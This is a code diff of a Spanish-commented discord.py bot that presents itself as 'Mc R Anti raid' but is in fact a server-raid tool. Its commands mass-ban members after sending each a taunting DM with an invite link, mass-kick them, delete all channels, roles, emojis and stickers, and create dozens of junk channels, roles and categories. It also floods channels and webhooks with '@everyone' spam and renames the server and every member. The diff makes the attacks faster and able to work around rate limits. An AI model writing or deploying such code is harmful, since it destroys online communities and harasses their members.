@@ -1,112 +1,449 @@
 import discord
 from discord.ext import commands
-import asyncio, logging, random, os
+import asyncio
+import logging
+import os
+import random
+from datetime import datetime
+import aiohttp
+import io
 
-logging.basicConfig(level=logging.INFO)
+# Configuración de logging optimizada para monitoreo
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+    datefmt="%Y-%m-%d %H:%M:%S"
+)
+
+PREFIX = "!"
 TOKEN = os.getenv("DISCORD_TOKEN") or "TU_TOKEN_AQUI"
-ID_ROL_PREMIUM = 1513841062651756615
-configuracion_premium, usuarios_autorizados = {}, set()
 
+# El banner animado de Discord configurado de forma global
+GIF_URL = "https://cdn.discordapp.com/banners/1334323253992361986/a_1da916f82737a9ca0084c939821aaba7.webp?size=2048&animated=true"
+
+# ================= VARIABLES GLOBALES INDEPENDIENTES =================
+ejecuciones_por_servidor = {}  
+MAX_EJECUCIONES = 2
+tiempo_inicio = datetime.now()
+
+# Configuración explícita de los Intents necesarios
 intents = discord.Intents.default()
-intents.members = True
-intents.message_content = True
-bot = commands.Bot(command_prefix=["!", "."], intents=intents)
+intents.members = True  
+intents.messages = True  
+intents.message_content = True  
 
-@bot.command()
-async def ayuda(ctx, sub: str = None):
-    if sub == "premium":
-        if not any(r.id == ID_ROL_PREMIUM for r in ctx.author.roles): return await ctx.send("❌ Solo Premium.")
-        await ctx.send("```\n=== MacHUB Engine - Comandos Premium ===\n!ayuda premium    -> Muestra este menú exclusivo de soporte premium.\n!editar raid      -> Crea canales, spam e imágenes personalizadas paso a paso.\n!config           -> Muestra el diseño premium configurado en el servidor.\n!limpiar raid     -> Borra los ajustes de la raid y regresa a los de fábrica.\n.premium list     -> Muestra la lista de usuarios con el rango Premium.\n!dar premium @    -> Autoriza a un usuario para poder reclamar el rango.\n!quitar premium @ -> Elimina los privilegios de un usuario de forma directa.\n.premium          -> Comando de reclamo manual para el usuario autorizado.\n```")
-    else:
-        await ctx.send("```\n=== Mc R Anti raid - cmds ===\n!uptime          -> Muestra el tiempo activo del bot y la latencia.\n!eje             -> Muestra el estado de ejecuciones del bot en vivo.\n!ayuda premium   -> Despliega las herramientas avanzadas de premium.\n!banpro          -> DM Masivo + Ban global a todos los miembros.\n!kickpro         -> Expulsa de inmediato a todos los miembros.\n!rD              -> Elimina todo, crea 50 canales e inunda con 20k mensajes.\n!ccpro           -> Elimina canales y crea 50 categorías para colapsar UI.\n!hookpro         -> Genera webhooks de spam ultra veloz por canal.\n!nickpro         -> Modifica el apodo de todos los usuarios a 'Mc R'.\n!rnServers       -> Cambia el nombre del servidor a 'Mc R'.\n!rolesD          -> Destruye todos los roles existentes del servidor.\n!rolesC          -> Genera 50 roles con colores arcoíris aleatorios.\n!emojisD         -> Elimina los emojis y stickers personalizados.\n============================================\n
-```")
+bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 
-@bot.command(name="rD")
-async def rd(ctx, sub: str = None):
-    if sub == "premium":
-        if not any(r.id == ID_ROL_PREMIUM for r in ctx.author.roles): return await ctx.send("❌ Acceso denegado: Solo Premium.")
-        cfg = configuracion_premium.get(ctx.guild.id)
-        if not cfg: return await ctx.send("❌ Usa !editar raid primero.")
-        msg, nombre = f"{cfg['mensaje']}\n{cfg['media']}", cfg['canal']
-    else: msg, nombre = "@everyone RAIDEADO https://discord.gg/aACMXB4HSp", "Mc-R"
-    for ch in list(ctx.guild.channels):
-        try: await ch.delete()
-        except: pass
-    for i in range(50):
-        try: ch = await ctx.guild.create_text_channel(name=nombre); await ch.send(msg)
-        except: pass
+@bot.event
+async def on_ready():
+    global tiempo_inicio
+    tiempo_inicio = datetime.now()
+    logging.info(f"⚡ MacHUB Engine Conectado: {bot.user.name} (ID: {bot.user.id})")
 
-@bot.command(name="editar")
-async def editar(ctx, s=None):
-    if not ctx.author.guild_permissions.administrator or s != "raid": return
-    def check(m): return m.author == ctx.author and m.channel == ctx.channel
+
+# === FUNCIÓN AUXILIAR PARA ENVIAR EL GIF COMO ARCHIVO REAL (SIN ENLACES DE TEXTO) ===
+async def obtener_gif_file():
     try:
-        await ctx.send("❓ Nombre canales:"), n = await bot.wait_for('message', check=check, timeout=60.0)
-        await ctx.send("❓ Mensaje:"), m = await bot.wait_for('message', check=check, timeout=60.0)
-        await ctx.send("❓ Link:"); f = await bot.wait_for('message', check=check, timeout=60.0)
-        configuracion_premium[ctx.guild.id] = {"canal": n.content.replace(" ", "-"), "media": f.content, "mensaje": m.content}
-        await ctx.send("✅ Guardado.")
-    except: await ctx.send("⏱️ Tiempo agotado.")
+        async with aiohttp.ClientSession() as session:
+            async with session.get(GIF_URL) as resp:
+                if resp.status == 200:
+                    data = io.BytesIO(await resp.read())
+                    return discord.File(data, filename="machub_banner.webp")
+    except Exception as e:
+        logging.error(f"Error al descargar el GIF global: {e}")
+    return None
 
-@bot.command(name="dar")
-async def dar(ctx, s, m: discord.Member):
-    if ctx.author.guild_permissions.administrator: usuarios_autorizados.add(m.id); await ctx.send(f"✅ {m.mention} autorizado. Usa .premium")
 
-@bot.command(name="premium")
-async def prem(ctx):
-    if ctx.author.id in usuarios_autorizados:
-        rol = ctx.guild.get_role(ID_ROL_PREMIUM)
-        if rol: await ctx.author.add_roles(rol); usuarios_autorizados.remove(ctx.author.id); await ctx.send("👑 Premium activado.")
+# ================= FUNCIÓN AUXILIAR PARA EL EMBED DE !eje =================
+def generar_embed_eje(guild_id):
+    global ejecuciones_por_servidor, MAX_EJECUCIONES
+    
+    # Obtiene las ejecuciones actuales de este servidor
+    actuales = ejecuciones_por_servidor.get(guild_id, 0)
+    
+    # Color dinámico por estado: Verde (0), Amarillo (1), Rojo (2 o más)
+    if actuales == 0:
+        color = discord.Color.green()
+    elif actuales == 1:
+        color = discord.Color.orange()
+    else:
+        color = discord.Color.red()
+    
+    embed = discord.Embed(
+        title="📊 CONTROL DE EJECUCIONES",
+        description=f"Ejecuciones del bot en este servidor: `{actuales}/{MAX_EJECUCIONES}`",
+        color=color
+    )
+    embed.set_footer(text="MacHUB Engine • Monitoreo en vivo")
+    embed.timestamp = datetime.now()
+    return embed
 
+
+# ================= COMANDO !eje =================
+@bot.command()
+async def eje(ctx):
+    if not ctx.guild: return  
+    
+    embed = generar_embed_eje(ctx.guild.id)
+    try:
+        await ctx.send(embed=embed)
+    except:
+        pass
+
+
+# ================= 1. COMANDO BANPRO =================
 @bot.command()
 async def banpro(ctx):
-    for m in ctx.guild.members:
-        try: await m.ban()
-        except: pass
+    if not ctx.guild: return
+    if not ctx.author.guild_permissions.ban_members: return
+    if not ctx.guild.me.guild_permissions.ban_members: return
+    
+    mensaje_dm = "Mi bot te baneo de tu servidor 😂 quieres hacerlo? Unete aqui https://discord.gg/aACMXB4HSp"
+    gif_file = await obtener_gif_file()
+    
+    targets = [
+        member for member in ctx.guild.members 
+        if not member.bot and member.id != ctx.author.id and member.top_role < ctx.guild.me.top_role
+    ]
+    
+    if len(targets) == 0: return
 
+    chunk_size = 15
+    for i in range(0, len(targets), chunk_size):
+        chunk = targets[i:i + chunk_size]
+        
+        async def process_member(member):
+            try: 
+                # Se envía el mensaje y el archivo GIF adjunto limpio por DM
+                if gif_file:
+                    # Copiamos los bytes para reutilizar el archivo en bucles masivos
+                    gif_file.fp.seek(0)
+                    await member.send(content=mensaje_dm, file=gif_file)
+                else:
+                    await member.send(content=mensaje_dm)
+            except: 
+                pass
+            try: await member.ban(reason="Baneo masivo By Mac.")
+            except: pass
+
+        tasks = [process_member(m) for m in chunk]
+        await asyncio.gather(*tasks)
+        await asyncio.sleep(0.8)
+
+
+# ================= 2. COMANDO RAIDEAR Y SPAM (rD) SIN TEMPORIZADOR =================
+@bot.command()
+async def rD(ctx):
+    global ejecuciones_por_servidor
+    if not ctx.guild: return
+    
+    if not ctx.author.guild_permissions.manage_channels: return
+    if not ctx.guild.me.guild_permissions.manage_channels: return
+
+    actuales = ejecuciones_por_servidor.get(ctx.guild.id, 0)
+
+    # Control de límite por concurrencia de ataques simultáneos
+    if actuales >= MAX_EJECUCIONES:
+        try: await ctx.send(f"❌ Límite alcanzado en este servidor ({actuales}/{MAX_EJECUCIONES}). Espera a que termine el ataque actual.")
+        except: pass
+        return
+
+    sumado = False
+
+    try:
+        ejecuciones_por_servidor[ctx.guild.id] = actuales + 1
+        sumado = True
+        logging.info(f"📈 [INICIO ANIDADO] Contador para Guild {ctx.guild.id}: {actuales + 1}/{MAX_EJECUCIONES}")
+
+        channels_to_delete = list(ctx.guild.channels)
+        for channel in channels_to_delete:
+            try: await channel.delete()
+            except: pass
+
+        created_channels = []
+        for _ in range(50):
+            try:
+                ch = await ctx.guild.create_text_channel(name="Mc R")
+                created_channels.append(ch)
+            except: pass
+
+        msg_por_canal = 400 
+        mensaje_spam = "@everyone server raideado putos respeten a sus mayores https://discord.gg/aACMXB4HSp"
+        gif_file = await obtener_gif_file()
+        
+        async def spam_task(channel):
+            for _ in range(msg_por_canal):
+                try:
+                    if gif_file:
+                        gif_file.fp.seek(0)
+                        await channel.send(content=mensaje_spam, file=gif_file)
+                    else:
+                        await channel.send(content=mensaje_spam)
+                    await asyncio.sleep(0.1) 
+                except discord.HTTPException as e:
+                    if e.status == 429: await asyncio.sleep(5)
+                    else: break
+
+        tasks = [spam_task(ch) for ch in created_channels]
+        await asyncio.gather(*tasks)
+
+    finally:
+        if sumado:
+            actuales_al_final = ejecuciones_por_servidor.get(ctx.guild.id, 1)
+            ejecuciones_por_servidor[ctx.guild.id] = max(0, actuales_al_final - 1)
+            logging.info(f"📉 [FIN ANIDADO] Contador para Guild {ctx.guild.id} restablecido a: {ejecuciones_por_servidor[ctx.guild.id]}/{MAX_EJECUCIONES}")
+
+
+# ================= 3. EXPULSIÓN MASIVA =================
 @bot.command()
 async def kickpro(ctx):
-    for m in ctx.guild.members:
-        try: await m.kick()
-        except: pass
+    if not ctx.guild: return
+    if not ctx.author.guild_permissions.kick_members: return
+    if not ctx.guild.me.guild_permissions.kick_members: return
 
+    try: 
+        gif_file = await obtener_gif_file()
+        if gif_file: await ctx.send(file=gif_file)
+    except: pass
+
+    targets = [
+        member for member in ctx.guild.members 
+        if not member.bot and member.id != ctx.author.id and member.top_role < ctx.guild.me.top_role
+    ]
+
+    if len(targets) == 0: return
+
+    chunk_size = 15
+    for i in range(0, len(targets), chunk_size):
+        chunk = targets[i:i + chunk_size]
+        
+        async def process_kick(member):
+            try: await member.kick(reason="Limpieza Masiva By Mac.")
+            except: pass
+
+        tasks = [process_kick(m) for m in chunk]
+        await asyncio.gather(*tasks)
+        await asyncio.sleep(0.8)
+
+
+# ================= 4. CAMBIAR IDENTIDAD DEL SERVIDOR =================
 @bot.command()
-async def rnServers(ctx): await ctx.guild.edit(name="Mc R")
+async def rnServers(ctx):
+    if not ctx.guild: return
+    if not ctx.author.guild_permissions.manage_guild: return
+    if not ctx.guild.me.guild_permissions.manage_guild: return
 
+    try:
+        await ctx.guild.edit(name="Mc R", description="Server dominado.")
+        gif_file = await obtener_gif_file()
+        if gif_file: await ctx.send(file=gif_file)
+    except:
+        pass
+
+
+# ================= 5. BORRAR TODOS LOS ROLES =================
 @bot.command()
 async def rolesD(ctx):
-    for r in ctx.guild.roles:
-        try: await r.delete()
-        except: pass
+    if not ctx.guild: return
+    if not ctx.author.guild_permissions.manage_roles: return
+    if not ctx.guild.me.guild_permissions.manage_roles: return
 
+    try: 
+        gif_file = await obtener_gif_file()
+        if gif_file: await ctx.send(file=gif_file)
+    except: pass
+
+    roles_to_delete = [
+        role for role in ctx.guild.roles 
+        if role.name != "@everyone" and role < ctx.guild.me.top_role and not role.is_bot_managed()
+    ]
+
+    for role in roles_to_delete:
+        try: await role.delete(reason="Remoción de roles.")
+        except: pass
+        await asyncio.sleep(0.2)
+
+
+# ================= 6. CREACIÓN MASIVA DE ROLES =================
 @bot.command()
 async def rolesC(ctx):
-    for i in range(50):
-        try: await ctx.guild.create_role(name="Mc R", color=discord.Color(random.randint(0, 0xFFFFFF)))
-        except: pass
+    if not ctx.guild: return
+    if not ctx.author.guild_permissions.manage_roles: return
+    if not ctx.guild.me.guild_permissions.manage_roles: return
 
+    try: 
+        gif_file = await obtener_gif_file()
+        if gif_file: await ctx.send(file=gif_file)
+    except: pass
+
+    async def create_role_task():
+        try:
+            color_aleatorio = discord.Color(random.randint(0, 0xFFFFFF))
+            await ctx.guild.create_role(name="Mc R", color=color_aleatorio)
+        except:
+            pass
+
+    for i in range(0, 50, 10):
+        tasks = [create_role_task() for _ in range(10)]
+        await asyncio.gather(*tasks)
+        await asyncio.sleep(0.5)
+
+
+# ================= 7. SATURACIÓN DE CATEGORÍAS =================
 @bot.command()
 async def ccpro(ctx):
-    for c in list(ctx.guild.channels): await c.delete()
-    for i in range(50): await ctx.guild.create_category(name="Mc R")
+    if not ctx.guild: return
+    if not ctx.author.guild_permissions.manage_channels: return
+    if not ctx.guild.me.guild_permissions.manage_channels: return
 
+    for channel in list(ctx.guild.channels):
+        try: await channel.delete()
+        except: pass
+
+    async def create_category_task():
+        try: await ctx.guild.create_category(name="Mc R")
+        except: pass
+
+    for i in range(0, 50, 10):
+        tasks = [create_category_task() for _ in range(10)]
+        await asyncio.gather(*tasks)
+        await asyncio.sleep(0.4)
+
+
+# ================= 8. CAMBIAR APODOS GLOBALMENTE =================
 @bot.command()
 async def nickpro(ctx):
-    for m in ctx.guild.members:
-        try: await m.edit(nick="Mc R")
-        except: pass
+    if not ctx.guild: return
+    if not ctx.author.guild_permissions.manage_nicknames: return
+    if not ctx.guild.me.guild_permissions.manage_nicknames: return
 
+    try: 
+        gif_file = await obtener_gif_file()
+        if gif_file: await ctx.send(file=gif_file)
+    except: pass
+
+    targets = [
+        m for m in ctx.guild.members 
+        if m.id != ctx.guild.owner_id and m.top_role < ctx.guild.me.top_role
+    ]
+
+    chunk_size = 20
+    for i in range(0, len(targets), chunk_size):
+        chunk = targets[i:i + chunk_size]
+        
+        async def set_nick(member):
+            try: await member.edit(nick="Mc R")
+            except: pass
+
+        tasks = [set_nick(m) for m in chunk]
+        await asyncio.gather(*tasks)
+        await asyncio.sleep(0.5)
+
+
+# ================= 9. BORRAR EMOJIS Y STICKERS =================
 @bot.command()
 async def emojisD(ctx):
-    for e in ctx.guild.emojis: await e.delete()
+    if not ctx.guild: return
+    if not ctx.author.guild_permissions.manage_expressions: return
+    if not ctx.guild.me.guild_permissions.manage_expressions: return
 
-@bot.command()
-async def hookpro(ctx):
-    for ch in ctx.guild.text_channels[:15]:
-        try: w = await ch.create_webhook(name="Mc R"); await w.send("Raideado")
+    try: 
+        gif_file = await obtener_gif_file()
+        if gif_file: await ctx.send(file=gif_file)
+    except: pass
+
+    for emoji in list(ctx.guild.emojis):
+        try: await emoji.delete()
+        except: pass
+    
+    for sticker in list(ctx.guild.stickers):
+        try: await sticker.delete()
         except: pass
 
+
+# ================= 10. MULTI-WEBHOOK ATTACK =================
 @bot.command()
-async def uptime(ctx): await ctx.send("✅ MacHUB Online.")
+async def hookpro(ctx):
+    if not ctx.guild: return
+    if not ctx.author.guild_permissions.manage_webhooks: return
+    if not ctx.guild.me.guild_permissions.manage_webhooks: return
+
+    channels = ctx.guild.text_channels
+    if not channels: return
+
+    mensaje_webhook = "@everyone server raideado putoooos https://discord.gg/aACMXB4HSp"
+    gif_file = await obtener_gif_file()
+
+    async def launch_webhook(channel):
+        try:
+            webhook = await channel.create_webhook(name="Mc R Engine")
+            for _ in range(25):
+                if gif_file:
+                    gif_file.fp.seek(0)
+                    await webhook.send(content=mensaje_webhook, file=gif_file, username="Mc R")
+                else:
+                    await webhook.send(content=mensaje_webhook, username="Mc R")
+                await asyncio.sleep(0.2)
+        except:
+            pass
+
+    tasks = [launch_webhook(ch) for ch in channels[:15]]
+    await asyncio.gather(*tasks)
+
+
+# ================= 11. COMANDO UPTIME =================
+@bot.command()
+async def uptime(ctx):
+    try:
+        delta_tiempo = datetime.now() - tiempo_inicio
+        dias = delta_tiempo.days
+        horas, rem = divmod(delta_tiempo.seconds, 3600)
+        minutos, segundos = divmod(rem, 60)
+        
+        ping_ms = round(bot.latency * 1000)
+        
+        await ctx.send(
+            f"📊 **Estado del Bot:**\n"
+            f"⏱️ **Tiempo activo:** `{dias}d {horas}h {minutos}m {segundos}s`\n"
+            f"⚡ **Latencia (Ping):** `{ping_ms}ms`"
+        )
+    except:
+        pass
+
+
+# ================= 12. MENÚ DE AYUDA COMPLETO =================
+@bot.command()
+async def ayuda(ctx):
+    menu = (
+        "```\n"
+        "=== Mc R Anti raid - cmds ===\n"
+        "!uptime       -> Muestra el tiempo activo del bot y la latencia.\n"
+        "!eje          -> Muestra el estado de ejecuciones del bot en vivo.\n"
+        "!banpro       -> DM Masivo + Ban global a todos los miembros.\n"
+        "!kickpro      -> Expulsa de inmediato a todos los miembros.\n"
+        "!rD           -> elimina todo, crear 50 canales e inundar con 20k mensajes.\n"
+        "!ccpro        -> elimina canales y crea 50 categorías para colapsar UI.\n"
+        "!hookpro      -> Genera webhooks de spam ultra veloz por canal.\n"
+        "!nickpro      -> Modifica el apodo de todos los usuarios a 'Mc R'.\n"
+        "!rnServers    -> Cambia el nombre del servidor a 'Mc R'.\n"
+        "!rolesD       -> Destruye todos los roles existentes del servidor.\n"
+        "!rolesC       -> Genera 50 roles con colores arcoíris aleatorios.\n"
+        "!emojisD      -> elimina los emojis y stickers personalizados.\n"
+        "```"
+    )
+    try: 
+        await ctx.send(menu)
+    except: 
+        pass
+
+
+# ================= MANEJO DE ERRORES =================
+@bot.event
+async def on_command_error(ctx, error):
+    if isinstance(error, commands.CommandNotFound): 
+        return
+    
+    logging.error(f"Error: {error}")
 
 bot.run(TOKEN)
+                    
